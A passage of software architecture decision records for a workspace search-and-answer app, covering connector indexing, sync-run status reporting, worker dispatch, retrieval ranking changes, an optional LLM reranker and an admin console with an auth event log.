   - **Google Calendar** (`calendar.readonly`): **indexed, not live** (this changes ADR-0032's plan). Answers need citable passages, and live results have no chunk to cite. A rolling window from 30 days back to 90 ahead is re-read hourly. Each event's date is its *start*, so "next week" works through the planner's date filter. Cancelled events and ones outside the window leave.
   - **Google Drive** (`drive.readonly`, not `drive.file`): `drive.file` needs Google's Picker (another API key and UI). Gmail already makes Slate an unverified app with a restricted scope, so this costs nothing more. Google Docs (exported as text) and text files only for now. Incremental by modified time, a weekly 365-day full pass capped at 500 files (no pruning when capped).
   - **Slack** (user token: `channels:history`, `channels:read`, `users:read`): public channels the user is in, one document per channel per UTC day, top-level messages with reply counts. Each pass re-reads from the day before the last message seen. A channel the user left is removed (`deleted_prefixes`).
6. **Failures** are mapped once (`core/adapters/oauth/api.py`): 401 means reconnect; 429 and rate-limit 403s are `RateLimited` with Retry-After; other 403s are a `ConnectorError` asking for every permission; 5xx is retried twice, then `UpstreamUnavailable`. Slack's and Linear's errors inside a 200 response are mapped by their adapters. Only https hosts fixed per adapter are called, never following redirects, and only status codes and error reasons are logged.
7. **Gmail beside IMAP:** if the same mailbox is connected both ways, Integrations warns that it is indexed twice.
8. **The planner** knows the new kinds (notion, linear, calendar, drive, slack; Gmail joins email), each guarded by `names_kind` like the old ones.
**Alternatives:** Live lookups for Calendar (needs a citation model for ephemeral passages, later). One service per provider (rejected above). Pruning by listing every id each run (too many API calls; weekly full passes instead).
**Consequences:** A new indexed provider is a spec, a connector and its connector name in migration 0010's CHECK. Slack's 2025 rate limits for apps outside its Marketplace can make Slack syncs slow; runs stop and resume. Sheets, Slides, PDFs, Slack threads and private channels are later work.

## ADR-0034: Honest sync outcomes: one run boundary, skip accounting, status from facts
**Status:** Accepted (2026-11-27, docs/IMPROVEMENT_PLAN.md P0-0 to P0-4).
**Context:** Connected sources showed "Queued · 0 documents" while every GitHub sync crashed (a `headers` TypeError in the adapter). Four sync engines each hand-wrote the run's `try/except/finally`. GitHub's and Discord's caught only known errors, so any other exception still ran `finally` and recorded **succeeded, 0 seen**, which also moved `last_synced_at`. The inline runner turned a crash into "continues in the background", and "Sync now" read the *job's* outcome, so a job that finished while its run failed was reported as done. The badge showed `queued` for a failed job waiting for a retry that no worker would ever run. Drive and GitHub dropped files they don't read without saying so. The mbox import created runs of kind `import`, which the 0001 CHECK rejects. Fakes don't enforce CHECKs, so the tests never saw it.
**Decision:**
1. **One run boundary** (`core/services/sync_run.py`, `RunBoundary`, an async context manager) owns every run's outcome for GitHub, Discord, IMAP, mbox and the connected engine. It handles each way out of the block: success; `BudgetExceeded` (partial); `RateLimited` (partial, re-raised for backoff); any other `AppError` (failed, recorded, swallowed); any other `Exception` (failed, recorded as retryable, logged with file:function:line, re-raised so the job retries and eventually dies); cancellation and other `BaseException`s (partial "interrupted", bookkeeping under `asyncio.shield`, re-raised). Stored text names only the exception *type*, never its message (rule 5). Engines keep only their own cases (out of time, Discord intents).
2. **Typed configs:** a GitHub source's `installation_id`/`full_name` and a Discord `guild_id` are parsed. A bad one is a plain `ConnectorError`, not a `KeyError`.
3. **Skip accounting** (migration 0011): `ingestion_runs.docs_skipped` and `skipped jsonb` (`{"reason[:kind]": count}`, bounded to 24 keys in `core.domain.skips`, junk dropped at the storage edge). Reasons: `unsupported_type`, `too_large`, `empty_text`, `unreadable`, `excluded_path`, `cap_reached`. The GitHub tarball walk ends with one `TreeSkips` item. A connector `Page` carries `skipped`. Drive now lists every non-folder file and counts what it can't read (unsupported types stay out of the prune set), and its full pass is also capped at 5,000 listed files. The connected engine counts empty documents instead of dropping them. 0011 also allows run kind `import`.
4. **Status from facts** (`core.domain.source_status`, pure): the catalog query returns raw job and run facts, and one function picks the badge with a reason. New badges: `retrying` (a failed job awaiting retry, with its error), `waiting_for_worker` (a runnable job overdue by over 2 h, or a running one stuck past 30 min), `empty` (synced, 0 documents, with what was skipped). A dead job newer than the last good run is `failed`, which also repairs history written before this ADR. A run left `running` for 15 min with no job is `failed` ("interrupted"). "Processing N" counts only `busy` badges.
5. **"Sync now" answers from the run** (`SourceActions.sync_now` → `SyncResult`): `done`, `partial`, `failed` (with the run's reason) or `background`. The inline runner has a `FAILED` outcome for crashes (still retried by the worker). `background` is said only while no job in the workspace is overdue, otherwise it's `failed` with the worker message. The response also carries the run's skip summary.
**Worker liveness without a new table:** the worker drains every runnable job each hourly run and clears `locked_by` on completion, so "a runnable job overdue by 2 h" is the proof that no worker handles that kind. It also catches a worker running with a handler disabled by a missing secret, which a heartbeat table would miss.
**Alternatives:** A base class or decorator for engines (a decorator can't see engine state such as the checkpoint, and a base class would couple four different engines). A `worker_heartbeats` table (an extra write and a global, non-workspace table; it would still miss disabled handlers). A GitHub tree pre-scan at connect to preview what's indexed (one API call per listed repo, and an install can list hundreds; the connect page now shows the first run's real skip summary instead).
**Consequences:** API contract: `SyncOut.status` is `done|partial|failed|background` (was `done|queued`) with `reason` and `skipped_summary`. `SourceOut` gains `status_reason`, `busy`, `healthy` and `skipped_summary`. `RunOut` gains `docs_skipped`, `skipped` and `skipped_summary`. **Deploy order:** run `alembic upgrade head` (0011) *before* deploying the API and the worker, because `finish_run` writes the new columns.

**Amendment (2026-11-27, after the first production run):** two rules were too broad.
(a) Waiting jobs that were all due before a run that worked (`last_ok_run_at > max(run_after)`) are leftovers, such as retries of a bug a deploy has since fixed. They no longer set the badge.
(b) "Is the worker behind?" is asked **per source**, and a run that worked since a job was due clears it. Before, Wave's four stale retries made Gmail's first sync report "failed".
A sync that the inline time limit cut off now reports `partial` ("Synced N item(s) so far. … The rest continues when the background worker runs."). "Sync now" reads only the run it started itself, using `LastRun.started_at`. A job that succeeds clears `last_error`, so an old attempt's error no longer appears next to "succeeded".

## ADR-0035: Start the worker on demand with workflow_dispatch
**Status:** Accepted (2026-11-27).
**Context:** The worker is the GitHub Actions `sync` workflow on an hourly cron. Production showed GitHub starting it only every 8–10 hours (Nov 25 23:37, Nov 26 08:12, 18:25, Nov 27 02:10, 10:49 UTC), because scheduled runs on quiet free repos are best effort. Anything that didn't finish in the API's ~90 s inline run (Gmail's first sync, big uploads, mbox imports, retries) waited hours. On-demand dispatch was planned in M1 (`WorkerTrigger`, `GITHUB_DISPATCH_TOKEN`) but never wired.
**Decision:**
1. `GitHubWorkflowTrigger` (`core/adapters/github/dispatch.py`) implements `WorkerTrigger` with `POST /repos/{GITHUB_REPO}/actions/workflows/sync.yml/dispatches {"ref": "main"}`.
2. **`workflow_dispatch`, not `repository_dispatch`:** it needs a fine-grained token with **Actions: read and write** on this repo only. `repository_dispatch` needs Contents: write, which could push code. The token lives only on the API (Vercel), never in the worker.
3. **Triggered only on handoff**, not on every enqueue: when "Sync now" or a first sync returns anything but `done` (the rest of a big sync, a crash's retry, a deferred job), and when an upload or mbox import is queued rather than indexed inline. A sync that finished inline wakes nothing.
4. **Best effort and cheap:** one attempt, a 5 s timeout, never raises (a missed nudge just waits for the cron), at most one dispatch per 2 minutes per API instance, and the workflow's `concurrency: worker` group collapses bursts to one running and one pending. Logs carry the status code and a reason label, never the token.
5. No token or repo configured: `NoWorkerTrigger`, so behaviour is unchanged.
**Alternatives:** An external free cron (cron-job.org) calling the same API (another account and secret, still hourly at best). Triggering on every enqueue (wakes the worker, and Neon, for syncs that already finished inline). Running the worker on Vercel (the 300 s limit, ADR-0003).
**Consequences:** Work handed to the worker starts in about 20–60 s (Actions start-up) instead of hours. Each extra worker run keeps Neon awake for a few minutes, bounded by the throttle and real usage. Setup: create the token, then set `GITHUB_DISPATCH_TOKEN` and `GITHUB_REPO` on the Vercel API project.

**ADR-0021 amendment (2026-11-27, owner): generous limits during development.** The daily, per-workspace and new-account caps default to $5, so only the $5 monthly hard stop binds. The owner's first-week cap of $0.01/day stopped their own Gmail backfill at 306 conversations. Also, the worker never received `OWNER_EMAIL`, so its budget check treated the owner as a new stranger; `sync.yml` now passes it. **Before a public launch,** set the launch values (`DAILY_LLM_BUDGET_USD=0.50`, `WORKSPACE_MONTHLY_BUDGET_USD=0.25`, `WORKSPACE_DAILY_BUDGET_USD=0.05`, `NEW_ACCOUNT_DAILY_BUDGET_USD=0.01`) on Vercel and in `sync.yml`, or restore them as defaults.

## ADR-0036: Connectors hand over file bytes; the connected engine parses them
**Status:** Accepted (2026-11-27, docs/IMPROVEMENT_PLAN.md P1-1).
**Context:** Drive indexed only Google Docs and text files, so a Drive full of PDFs, Sheets and Slides synced to 0 documents. Slate already parses PDFs (pypdfium2), Word files and CSV for uploads, but rule 2 says a connector only fetches: it must not parse.
**Decision:**
1. `FetchedDocument.raw` (bytes, of type `mime`) carries a file that still needs parsing, with `sections` left empty. `ConnectedSources` parses it with the `Parser` port (`FormatParser`, the same one uploads use), wired in `connected_sources`. Parsing runs in `asyncio.to_thread`, because the engine also runs inline in an API request.
2. **Drive:** Google Docs and Slides are exported as `text/plain`. Sheets are exported as `text/csv`; Google exports only the first sheet, and CSV becomes Markdown tables. PDFs and `.docx` are downloaded whole (`ProviderApi.get_bytes`, never truncated, because a cut binary is corrupt). The 2 MB cap is checked against the listing's `size` before download, and against the bytes for exports, which have no size.
3. Unreadable files (the parser raises `ValidationFailed`) and types the parser doesn't support are counted skips (`unreadable`, `unsupported_type`), never crashes. Without a parser, raw files are `unsupported_type`.
**Alternatives:** Parsing inside the Drive adapter (breaks rule 2, and each connector would need its own parser wiring). Exporting Slides as PPTX and parsing that (needs a new dependency; Google's text export is enough for search). Using Drive's `fullText` search instead of indexing (no chunks, no ACL in SQL).
**Consequences:** More Drive content gets embedded, still within the 500-file full-pass cap and the budget guard. `.xlsx` and `.pptx` stay `unsupported_type`. Other connectors (Notion file blocks, Gmail attachments) can reuse `raw` later.

## ADR-0037: Titles and metadata in the keyword lane (`chunks.search_context`)
**Status:** Accepted (2026-11-27, docs/IMPROVEMENT_PLAN.md P1-3; migration 0012).
**Context:** `tsv_en` covered only `heading_path + content`, and `tsv_simple` only `content`. A word that appears only in a document's title ("the onboarding checklist", "brand guidelines"), or a repo name or sender, was invisible to the keyword lane. Only the vector lane saw the title, through the embedding prefix. The P1-8 `title-only` eval set measures this.
**Decision:**
1. `chunks.search_context text NOT NULL DEFAULT ''`, written with every chunk from `core.domain.chunking.search_context(title, author, metadata)`. It holds the title, the author, and the metadata values `repo`, `path`, `state` and `identifier` (string values only), at most 500 characters. The Postgres adapter computes it from the `DocumentUpsert` it already receives, so no port changes. The in-memory fake mirrors it.
2. Both generated tsvectors become `setweight(to_tsvector(cfg, search_context), 'A') || <the old expression>`. The body keeps the default weight D, so for `ts_rank_cd` a title match counts 10 times a body mention. Generated expressions can't be altered before PostgreSQL 17, so the columns are dropped and re-added and their GIN indexes recreated. The backfill runs between the two steps, so each row is rewritten only once.
3. **The embedding prefix is unchanged** (a deliberate deviation from the plan). Adding author and metadata there would give one embedding generation two prefix styles, and would break the backfill's "exactly the text ingestion embeds" rule, unless every chunk were re-embedded. The vector lane already sees the title.
**Alternatives:** Separate `title` and `metadata` columns with weights A and B (more columns for no measured gain yet). Putting the title into `content` (it would show in previews and citations). A join to `documents` at query time (the GIN index can't cover it, and it adds a join to the hottest query).
**Consequences:** **Deploy order:** run `alembic upgrade head` (0012) before deploying the API and the worker, because `write_document` writes the new column. The migration rewrites `chunks` under an ACCESS EXCLUSIVE lock: seconds at this size, but run it at a quiet time. Re-embedding is not needed. Keyword ranking changes, so record a keyword eval before and after (EVALS.md).

## ADR-0038: Follow-ups are anchored on the previous answer's citations (the anchor lane)
**Status:** Accepted (2026-11-27, docs/IMPROVEMENT_PLAN.md P1-5).
**Context:** A follow-up like "who decides that?" or "has it been paid yet?" shares no words with the passage it needs. The planner rewrites follow-ups into standalone queries using history, but when it guesses badly or falls back (no key, a timeout), retrieval starts from nothing. The P1-8 `multi-turn` set measures this, and the free retrieval eval runs without a planner.
**Decision:**
1. A fourth lane, `Lane.ANCHOR`: `SearchIndex.anchored_chunks(ws, principals, documents, query, k, filters)` returns chunks of the documents the latest answer cited (at most 8 documents, 20 chunks), ranked by `ts_rank_cd` against the new question, then by document and ordinal. Chunks that don't match are still returned, because that is the point.
2. Access is re-checked in the same SQL (`_VISIBLE` plus the filters), never assumed from the earlier turn: a document shared away since then disappears from the follow-up (rule 1).
3. It is fused by RRF at weight 1.0, like keyword and vector, so fresh evidence for the follow-up can still outrank it. `AnswerService._history` returns the last assistant message's cited document ids (ids only) with the history. The eval harness passes `history[-1].cited_documents`, and the guest run gets the same anchor to prove the lane filters.
**Alternatives:** Re-sending the previous passages to the model as-is (they would bypass ranking and the ACL re-check). Embedding the previous answer as an extra query (one more paid embedding per turn, and it drifts towards the old topic). Boosting cited documents in Python after fusion (post-filtering, which rule 1 forbids).
**Consequences:** One more cheap SQL query on follow-up turns only. The search API never sends an anchor, but its `lanes` and `matched_by` literal now includes `anchor` (openapi regenerated).

## ADR-0039: Source diversity in answer context, and cross-source and conflict prompting
**Status:** Accepted (2026-11-27, docs/IMPROVEMENT_PLAN.md P1-7). The prompt change needs an answer eval run (owner, paid).
**Context:** The model saw the top 16 fused passages. When one connector dominated (many uploads mention "leave"), a strong email or issue on the same question never reached it, so cross-source answers cited one kind. Conflicting facts (an old doc and a newer email) were not handled explicitly.
**Decision:**
1. Chat retrieves a pool of 50 fused hits (`DIVERSITY_POOL`). `core.domain.search.diversify` (pure) keeps 16: the top hits, plus the best hit of every connector found in the pool but missing from the top, if it scores at least half the top hit's fused score. Extras replace the lowest-ranked hits and go **after the first three**, because `_fit_hits` cuts from the end when the token budget runs out. This is a light form of MMR.
2. It applies only when nothing narrows the source: no planned `kinds`, and no user connector or source filter.
3. Prompt rule 9: connect evidence across kinds; when sources disagree, say so, give both with dates, and prefer the newer.
**Alternatives:** Full MMR with embedding similarity between passages (needs every passage's vector in the answer path). A per-connector quota (it would push weak passages in). An LLM selection step (P1-4, paid, optional).
**Consequences:** Searching the pool costs nothing extra: the lanes already fetch 50 candidates each. Measured by `cross_source_ok`, and by `conflict` point coverage, in `evals.answers`.

## ADR-0040: An optional LLM selection step behind a `Reranker` port (off by default)
**Status:** Accepted, **disabled** (2026-11-27, docs/IMPROVEMENT_PLAN.md P1-4; migration 0013). Turn it on only if answer evals improve.
**Context:** The model reads up to 16 passages in fused-rank order. On noisy, cross-source pools, weak passages dilute the answer and invite wrong citations. Onyx has an LLM pick which sections to read, one small decision per question. Free hosted rerankers are out, because ADR-0012 limits free providers to public data.
**Decision:**
1. A `Reranker` port (`core/ports/reranker.py`). `LLMReranker` (`core/services/rerank.py`) implements it over the existing `ChatModel` port (gpt-4o-mini), so there is no new vendor code. The prompt and the validation are pure (`core/domain/rerank.py`).
2. Only **summaries** go out: the top 30 fused hits as title, kind, date and the first 300 characters, numbered, as data in the user message. The reply must be `{"keep": [n...]}`; only offered numbers count, each once, at most 10.
3. `AnswerService` uses it for `lookup` intents only (recent and summary are about dates), when the pool has more than 10 hits. The kept hits, in the reranker's order, then go through the usual neighbour expansion.
4. It never fails an answer. A budget refusal, a provider error, a rate limit or an unusable reply all fall back to the `diversify` order. The call is budget-checked first and recorded as `rerank` in the usage ledger (migration 0013 extends the kind CHECK), with data class private.
5. `CHAT_RERANK=false` by default. `answer_service` wires `LLMReranker` only when it's on.
**Alternatives:** A cross-encoder or a hosted reranker (Cohere, Jina): no local models, and free tiers can't take private data. Scoring each passage in its own call (30 calls). Letting the answer model choose (a 16k-token prompt does that badly, which is the problem).
**Consequences:** About $0.0004 and one round trip (about 0.5–1 s) more per lookup question when enabled. **Before enabling:** apply 0013 and run `evals.answers` with and without it (`CHAT_RERANK=true uv run python -m evals.answers`), and compare citation validity, point coverage and `cross_source_ok`.

## ADR-0041: Reopened chats rebuild citations at read time, under current access
**Status:** Accepted (2026-11-28).
**Context:** `message_citations` stores only `(n, chunk_id, document_id)`. A reopened chat therefore showed "Source 1, Source 2…" with no passages and no hover cards. Follow-up suggestions were not stored at all.
**Decision:**
1. `GET /chat/sessions/{id}/messages` makes one batched lookup, `SearchIndex.chunks_by_id`, in `core/adapters/postgres/search.py`, through `SearchService.cited_chunks`. It uses the same `workspace_id` + `acl && :principals` rule as search, in SQL (rule 1). `CitationOut` gains optional title, heading path, snippet, connector, date and author. All of them are null when the chunk is gone or no longer visible, and the UI leaves that citation out.
2. Follow-ups are saved in the assistant message's `usage` JSON (`usage.followups`) next to `mode`. That needs no migration, and older answers simply have none.
**Alternatives:** Snapshot titles and passages into `message_citations` when the answer is saved. That is cheaper to read, but it keeps showing content after access is revoked or the document is deleted, which breaks "previews and citation links re-check access". A separate `followups` column: a migration for display-only data.
**Consequences:** One extra indexed query per history read (`chunks.id = ANY(...)`, at most 2,000 ids). A chat whose sources were revoked still shows its answer text, which the user already saw, but no longer shows the passages.

## ADR-0042: A platform admin console over an append-only auth event log
**Status:** Accepted (2026-11-28). The owner approved the scope: admin set by env var, full emails shown, disable/enable as the only action, and a 90-day event log.
**Context:** Sign-up, verification, sign-in and reset already existed (ADR-0021). The owner had no way to see how many people signed up, who is active, or whether sign-ins are being attacked. They also had no way to stop an abusive account. Sessions are deleted on sign-out, so they can't tell when someone last signed in. Failed sign-ins left no trace beyond the 15-minute throttle window.
**Decision:**
1. **Admin status is computed, never stored.** `Identity.is_platform_admin` is true only when the session's *verified* email canonically equals `OWNER_EMAIL` (`AuthService._is_owner`). No role column, endpoint or client field can grant it, so it can't be escalated through the database, the API or the browser. Outside dev, registering that address needs `SETUP_TOKEN` (ADR-0021), so nobody can claim it first.
2. **`AdminService` checks on every method** and answers `NotFound` (404) to everyone else, so the console's routes look absent. It reads only account metadata: email, name, join date, verified, disabled, last active and workspace count. It never reads documents, chats, connections, sources, hashes, tokens, IPs or user agents. The response models in `api/schemas/admin.py` are the allow-list, and a route test asserts their exact keys.
3. **`auth_events` (migration 0014)** records the kind, the user, the actor and the time. It deliberately holds no IP, user agent or email. It is platform-level, so like `users` it has no `workspace_id`. The worker's hourly housekeeping deletes rows older than 90 days. Writes are best-effort: a failed insert is logged and never fails sign-in.
4. **Last active** is `users.last_active_at` (migration 0015). It is set inside the session-create statement at sign-in and the session-touch statement (at most every 5 minutes), so it adds no round trips and survives session and event cleanup. "Active" means within 30 days.
5. **Disable/enable** sets `users.disabled_at`, deletes every session the user has, and records `account_disabled` or `account_enabled` with the admin as actor. The session lookup already joins away disabled users, so the change takes effect on the next request. You can't disable yourself or the `OWNER_EMAIL` account. A disabled account still gets the generic sign-in error. The status change and its event are one SQL statement, so they commit together, and a retry with no change writes no second event. Throttled sign-ins record at most one event per IP per 15 minutes, so retries can't fill the table. The sign-in rehash is compare-and-set, so it can never undo a reset that lands meanwhile.
7. **Delete (owner-requested 2026-11-28):** the admin can permanently delete any account except their own and `OWNER_EMAIL`, after typing its email (checked again by the server). One transaction locks the user and their workspaces, then:
   - refuses, changing nothing, if the account owns a workspace other people belong to (deleting it would wipe their content too);
   - otherwise deletes the account's sole-member workspaces (content cascades) and runs the same cleanup as "Remove member" in workspaces it joined;
   - records `account_deleted` (migration 0016) with the admin as actor and no user, then deletes the user (sessions, codes and connections cascade).
   Uploaded files are removed by the existing abandoned-upload sweep within a day. The email is free to sign up again.
6. **Rehash on sign-in:** after a successful sign-in, the hash is replaced if `needs_rehash` says its Argon2 parameters are out of date. Sign-in is the only time the plaintext is available.
**Alternatives:**
- A stored `is_admin` flag set by a CLI. It supports several admins, but it adds a privilege the database can grant, a migration and a new escalation path, all for a single-owner project.
- Deriving everything from `sessions`. It needs no table, but keeps no failed-sign-in history and loses the last sign-in after sign-out.
- Writing auth events into `audit_log`. That table is scoped to a workspace, and an account is not.
- A chart library. None is on the approved list (UI_DESIGN §12), so the two column charts are plain HTML.
**Consequences:** Each sign-up, verification, sign-in, failed sign-in, sign-out and reset adds one small insert. The existing rate limits bound it, so nobody can fill the table quickly, and retention caps its size. The admin sees full email addresses, by the owner's choice. The user list pages by offset, which is fine at this scale; events page by `id` (keyset). There is only one admin; a second would need a new ADR.
